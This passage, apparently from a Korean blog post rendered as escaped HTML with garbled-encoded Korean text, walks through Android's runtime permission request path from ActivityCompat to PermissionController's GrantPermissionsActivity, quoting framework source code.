&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;requestPermissions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;nd&quot;&gt;@NonNull&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Activity&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;activity&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;nd&quot;&gt;@NonNull&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;permissions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requestCode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// TODO: Change to comparison against API 23 once we have it defined.&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Build&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;VERSION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;CODENAME&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;equals&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;MNC&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Build&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;VERSION&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;SDK_INT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;nc&quot;&gt;ActivityCompatApi23&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;requestPermissions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;activity&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;permissions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requestCode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;activity&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;instanceof&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;OnRequestPermissionsResultCallback&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;nc&quot;&gt;Handler&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Handler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Looper&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getMainLooper&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Runnable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;nd&quot;&gt;@Override&lt;/span&gt;
          &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
              &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;grantResults&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;permissions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt;
              &lt;span class=&quot;nc&quot;&gt;Arrays&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;fill&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;grantResults&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;PackageManager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;PERMISSION_GRANTED&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
              &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;OnRequestPermissionsResultCallback&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;activity&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;onRequestPermissionsResult&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
                      &lt;span class=&quot;n&quot;&gt;requestCode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;permissions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;grantResults&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;});&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;í˜„ì¬ SDKì˜ ë²„ì „ì´ 23 ì´ìƒì¼ ê²½ìš°, &lt;code class=&quot;highlighter-rouge&quot;&gt;ActivityCompatApi23.requestPermissions&lt;/code&gt; ë¥¼ í˜¸ì¶œí•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ì•„ë˜ì˜ &lt;a href=&quot;https://chromium.googlesource.com/android_tools/+/refs/heads/master/sdk/sources/android-25/android/support/v4/app/ActivityCompatApi23.java#39&quot;&gt;ì½”ë“œ&lt;/a&gt;ë¥¼ ì‚´í´ë³´ì•„ì•¼ í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// ActivityCompatApi23&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;requestPermissions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Activity&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;activity&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;permissions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requestCode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;activity&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;instanceof&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;RequestPermissionsRequestCodeValidator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;RequestPermissionsRequestCodeValidator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;activity&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;validateRequestPermissionsRequestCode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;requestCode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;activity&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;requestPermissions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;permissions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requestCode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;í•´ë‹¹ ì½”ë“œì—ì„œëŠ” Activityí´ë˜ìŠ¤ì˜ requestPermissionsì„ í˜¸ì¶œí•˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆëŠ”ë°, í•´ë‹¹ &lt;a href=&quot;https://android.googlesource.com/platform/frameworks/base/+/master/core/java/android/app/Activity.java#5094&quot;&gt;ì½”ë“œ&lt;/a&gt;ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// Activity&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;requestPermissions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;@NonNull&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;permissions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requestCode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;requestCode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;IllegalArgumentException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;requestCode should be &amp;gt;= 0&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mHasCurrentPermissionsRequest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;Log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;TAG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Can request only one set of permissions at a time&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// Dispatch the callback with empty arrays which means a cancellation.&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;onRequestPermissionsResult&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;requestCode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;Intent&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;intent&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getPackageManager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;buildRequestPermissionsIntent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;permissions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;startActivityForResult&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;REQUEST_PERMISSIONS_WHO_PREFIX&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;intent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requestCode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mHasCurrentPermissionsRequest&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ìœ„ì˜ ì½”ë“œì—ì„œ ë³¼ ìˆ˜ ìˆë“¯, ìš”ì²­í•œ í¼ë¯¸ì…˜ì„ Packagemanagerí´ë˜ìŠ¤ì˜ buildRequestPermissionsIntentí•¨ìˆ˜ë¥¼ í†µí•´ Intentë¡œ ì „ì²˜ë¦¬ ì‘ì—…ì„ ê±°ì¹œ ì´í›„ Intent broadcastë¥¼ í•©ë‹ˆë‹¤. í•´ë‹¹ intentë¥¼ ì²˜ë¦¬í•  ìˆ˜ ìˆëŠ” ì•±ì´ ë°›ì•„ì„œ ì²˜ë¦¬í•œë‹¤ëŠ” ì´ì•¼ê¸°ì¸ë°, ê·¸ ì•±ì´ ë°”ë¡œ PermissionControllerì…ë‹ˆë‹¤. ë”°ë¼ì„œ í•´ë‹¹ &lt;a href=&quot;https://android.googlesource.com/platform/packages/apps/PackageInstaller/+/refs/heads/master/AndroidManifest.xml#82&quot;&gt;ë§í¬&lt;/a&gt;ë¥¼ í†µí•´ &lt;code class=&quot;highlighter-rouge&quot;&gt;Intent-filter&lt;/code&gt;ë¥¼ ì‚´í´ë³´ì•˜ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- PermissionController AndroidManifest.xml --&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;activity&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;android:name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;com.android.packageinstaller.permission.ui.GrantPermissionsActivity&quot;&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;android:configChanges=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;keyboardHidden|screenSize&quot;&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;android:excludeFromRecents=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;true&quot;&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;android:theme=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;@style/GrantPermissions&quot;&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;android:visibleToInstantApps=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;true&quot;&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;android:inheritShowWhenLocked=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;true&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;intent-filter&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;android:priority=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;action&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;android:name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;android.content.pm.action.REQUEST_PERMISSIONS&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;category&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;android:name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;android.intent.category.DEFAULT&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/intent-filter&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/activity&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ìœ„ì˜ intent-filterì—ì„œ í¼ë¯¸ì…˜ ìš”ì²­ì„ ë°›ì•„ì„œ ì²˜ë¦¬í•˜ë„ë¡ ë˜ì–´ìˆìœ¼ë¯€ë¡œ, í•´ë‹¹ Activity ì½”ë“œë¥¼ &lt;a href=&quot;https://android.googlesource.com/platform/packages/apps/PackageInstaller/+/refs/heads/master/src/com/android/packageinstaller/permission/ui/GrantPermissionsActivity.java#304&quot;&gt;ì•„ë˜&lt;/a&gt;ì—ì„œ ì‚´í´ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// GrantPermissionsActivity.onCreate ...&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;mCallingUid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;callingPackageInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;applicationInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nc&quot;&gt;UserHandle&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;userHandle&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;UserHandle&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getUserHandleForUid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mCallingUid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;DeviceUtils&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isTelevision&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mViewHandler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;com&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;android&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;packageinstaller&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;permission&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;ui&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;television&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;GrantPermissionsViewHandlerImpl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;mCallingPackage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setResultListener&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;DeviceUtils&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isWear&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;mViewHandler&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;GrantPermissionsWatchViewHandler&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setResultListener&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;DeviceUtils&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isAuto&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
